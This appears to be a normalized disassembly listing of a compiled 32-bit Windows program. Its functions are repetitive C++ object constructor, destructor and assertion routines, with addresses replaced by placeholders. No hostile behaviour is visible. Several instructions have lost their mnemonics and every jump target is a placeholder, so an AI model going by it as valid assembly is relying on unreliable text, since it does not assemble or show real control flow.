mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4c ]
imul eax eax 0x18
sub edi eax
add esi 0x4
call sub_41e928
mov edi [ ebx + 0x30 ]
mov eax [ ebp - 0x4 ]
add eax 0x34
add edi 0x14
call sub_41e6f8
mov esi [ ebp - 0x8 ]
sub_41cb7b
lea eax [ esi + 0x8 ]
call sub_41dcb7
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41cba8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x38 ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea ecx [ ebx + 0x8 ]
call sub_422541
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41cbec
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_4209dc
pop ebp
retn 0x4
sub_41cc48
lea eax [ esi + 0x8 ]
call sub_41dd06
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41cc75
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x38 ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea ecx [ ebx + 0x8 ]
call sub_4225ee
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41ccb9
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420a35
pop ebp
retn 0x4
sub_41cd15
lea eax [ esi + 0x8 ]
call sub_41dd55
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41cd42
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x38 ]
call sub_407804
mov esi [ ebp + 0x8 ]
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
lea eax [ ebx + 0x8 ]
push ecx
call sub_422666
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41cd86
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420a7b
pop ebp
retn 0x4
sub_41cde2
lea eax [ esi + 0x8 ]
call sub_41dda4
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41ce0f
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x38 ]
call sub_407804
mov esi [ ebp + 0x8 ]
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
lea eax [ ebx + 0x8 ]
push ecx
call sub_422711
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41ce53
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420ad4
pop ebp
retn 0x4
sub_41ceaf
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41cee2
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
call sub_407804
push eax
push [ ebp + 0x8 ]
add edi 0x8
push edi
call sub_420afb
pop edi
pop esi
pop ebp
retn 0x4
sub_41cf19
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420b1d
pop ebp
retn 0x4
sub_41cf75
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41cfa8
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
call sub_407804
push eax
push [ ebp + 0x8 ]
add edi 0x8
push edi
call sub_420b41
pop edi
pop esi
pop ebp
retn 0x4
sub_41cfdf
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
cmp [ eax + 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41d03d
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d070
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x1c ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea esi [ ebx + 0x8 ]
call sub_42288a
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41d0b4
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420b93
pop ebp
retn 0x4
sub_41d110
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d143
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x1c ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea esi [ ebx + 0x8 ]
call sub_422913
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41d187
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
cmp [ eax + 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41d1e5
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d218
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x1c ]
call sub_407804
mov esi [ ebp + 0x8 ]
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push ecx
lea ecx [ ebx + 0x8 ]
call sub_42298b
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41d25c
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420c03
pop ebp
retn 0x4
sub_41d2b8
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d2eb
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x1c ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
push ecx
lea esi [ ebx + 0x8 ]
call sub_422a3d
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41d32f
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
cmp [ eax + 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41d38d
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d3c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x1c ]
call sub_407804
mov esi [ ebp + 0x8 ]
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
lea edi [ ebx + 0x8 ]
push ecx
call sub_422ab1
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41d404
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420c76
pop ebp
retn 0x4
sub_41d460
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d493
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x1c ]
call sub_407804
mov esi [ ebp + 0x8 ]
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
lea edi [ ebx + 0x8 ]
push ecx
call sub_422b6a
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_41d4d7
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420ccc
pop ebp
retn 0x4
sub_41d533
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d566
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
call sub_407804
push eax
push [ ebp + 0x8 ]
add edi 0x8
push edi
call sub_420cf0
pop edi
pop esi
pop ebp
retn 0x4
sub_41d59d
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420d12
pop ebp
retn 0x4
sub_41d5f9
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d62c
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
call sub_407804
push eax
push [ ebp + 0x8 ]
add edi 0x8
push edi
call sub_420d49
pop edi
pop esi
pop ebp
retn 0x4
sub_41d663
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420d6b
pop ebp
retn 0x4
sub_41d6bf
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d6f2
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
call sub_407804
push eax
push [ ebp + 0x8 ]
add edi 0x8
push edi
call sub_420d8f
pop edi
pop esi
pop ebp
retn 0x4
sub_41d729
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420db1
pop ebp
retn 0x4
sub_41d785
push esi
push edi
push 0x5
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x1c ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41d7b8
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
call sub_407804
push eax
push [ ebp + 0x8 ]
add edi 0x8
push edi
call sub_420deb
pop edi
pop esi
pop ebp
retn 0x4
sub_41d7ef
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420e0d
pop ebp
retn 0x4
sub_41d84b
push ebp
mov ebp esp
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi ebx
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x24 ] esi
mov [ ebx + 0x28 ] edi
mov [ ebx + 0x2c ] 0x0
cmp eax esi
jbe r-xdata
test esi esi
mov esi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test edi edi
je r-xdata
push 0x50
push esi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push esi
push r--data
call sub_4258e2
add esp 0xc
cmp edi 0x3ffffffe
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebp
retn 0x8
push 0x52
push esi
push r--data
call sub_4258e2
add esp 0xc
cmp edi 0x1
je r-xdata
sub_41d8d6
push ebp
mov ebp esp
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi ebx
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x24 ] esi
mov [ ebx + 0x28 ] edi
mov [ ebx + 0x2c ] 0x0
cmp eax esi
jbe r-xdata
test esi esi
mov esi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test edi edi
je r-xdata
push 0x50
push esi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push esi
push r--data
call sub_4258e2
add esp 0xc
cmp edi 0x3ffffffe
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebp
retn 0x8
push 0x52
push esi
push r--data
call sub_4258e2
add esp 0xc
cmp edi 0x1
je r-xdata
sub_41d961
push ebp
mov ebp esp
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi ebx
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x24 ] esi
mov [ ebx + 0x28 ] edi
mov [ ebx + 0x2c ] 0x0
cmp eax esi
jbe r-xdata
test esi esi
mov esi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test edi edi
je r-xdata
push 0x50
push esi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push esi
push r--data
call sub_4258e2
add esp 0xc
cmp edi 0x3ffffffe
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebp
retn 0x8
push 0x52
push esi
push r--data
call sub_4258e2
add esp 0xc
cmp edi 0x1
je r-xdata
sub_41d9ec
push ebp
mov ebp esp
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi ebx
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x24 ] esi
mov [ ebx + 0x28 ] edi
mov [ ebx + 0x2c ] 0x0
cmp eax esi
jbe r-xdata
test esi esi
mov esi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test edi edi
je r-xdata
push 0x50
push esi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push esi
push r--data
call sub_4258e2
add esp 0xc
cmp edi 0x3ffffffe
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebp
retn 0x8
push 0x52
push esi
push r--data
call sub_4258e2
add esp 0xc
cmp edi 0x1
je r-xdata
sub_41da77
push ebp
mov ebp esp
push ebx
push edi
mov ebx edx
mov edi ecx
call sub_416f3f
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x38 ] edi
cmp edi esi
mov [ ebx + 0x3c ] esi
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x44 ] 0x0
mov edi r--data
jbe r-xdata
test esi esi
jne r-xdata
push 0x4f
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x3ffffffe
jne r-xdata
pop edi
mov eax ebx
pop ebx
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x1
je r-xdata
sub_41daff
push ebp
mov ebp esp
push ebx
push edi
mov ebx edx
mov edi ecx
call sub_416f3f
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x38 ] edi
cmp edi esi
mov [ ebx + 0x3c ] esi
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x44 ] 0x0
mov edi r--data
jbe r-xdata
test esi esi
jne r-xdata
push 0x4f
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x3ffffffe
jne r-xdata
pop edi
mov eax ebx
pop ebx
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x1
je r-xdata
sub_41db87
push ebp
mov ebp esp
push ebx
push edi
mov ebx edx
mov edi ecx
call sub_416f3f
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x38 ] edi
cmp edi esi
mov [ ebx + 0x3c ] esi
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x44 ] 0x0
mov edi r--data
jbe r-xdata
test esi esi
jne r-xdata
push 0x4f
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x3ffffffe
jne r-xdata
pop edi
mov eax ebx
pop ebx
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x1
je r-xdata
sub_41dc0f
push ebp
mov ebp esp
push ebx
push edi
mov ebx edx
mov edi ecx
call sub_416f3f
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x38 ] edi
cmp edi esi
mov [ ebx + 0x3c ] esi
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x44 ] 0x0
mov edi r--data
jbe r-xdata
test esi esi
jne r-xdata
push 0x4f
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x3ffffffe
jne r-xdata
pop edi
mov eax ebx
pop ebx
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0x8 ] 0x1
je r-xdata
sub_41dc97
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41df87
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41dcb7
push esi
mov esi eax
push edi
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax [ edi + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ edi + 0x24 ]
mov [ esi + 0x24 ] eax
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
mov al [ edi + 0x2c ]
mov [ esi + 0x2c ] al
mov eax esi
pop esi
retn
sub_41dce6
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41dfca
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41dd06
push esi
mov esi eax
push edi
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax [ edi + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ edi + 0x24 ]
mov [ esi + 0x24 ] eax
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
mov al [ edi + 0x2c ]
mov [ esi + 0x2c ] al
mov eax esi
pop esi
retn
sub_41dd35
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e00d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41dd55
push esi
mov esi eax
push edi
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax [ edi + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ edi + 0x24 ]
mov [ esi + 0x24 ] eax
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
mov al [ edi + 0x2c ]
mov [ esi + 0x2c ] al
mov eax esi
pop esi
retn
sub_41dd84
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e050
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41dda4
push esi
mov esi eax
push edi
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax [ edi + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ edi + 0x24 ]
mov [ esi + 0x24 ] eax
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
mov al [ edi + 0x2c ]
mov [ esi + 0x2c ] al
mov eax esi
pop esi
retn
sub_41ddd3
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e093
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41ddf3
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e0c3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41de13
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e0f3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41de33
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e123
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41de53
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e153
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41de73
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e183
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41de93
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e1b3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41deb3
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e1e3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41ded3
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e213
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41def3
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e243
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41df13
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e273
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41df33
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41e2a3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41df87
push 0x0
mov eax sub_44db90
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ edi + 0x8 ]
mov [ edi ] r--data
call sub_40487c
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41dfca
push 0x0
mov eax sub_44db62
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ edi + 0x8 ]
mov [ edi ] r--data
call sub_40487c
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e00d
push 0x0
mov eax sub_44db34
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ edi + 0x8 ]
mov [ edi ] r--data
call sub_40487c
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e050
push 0x0
mov eax sub_44db06
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
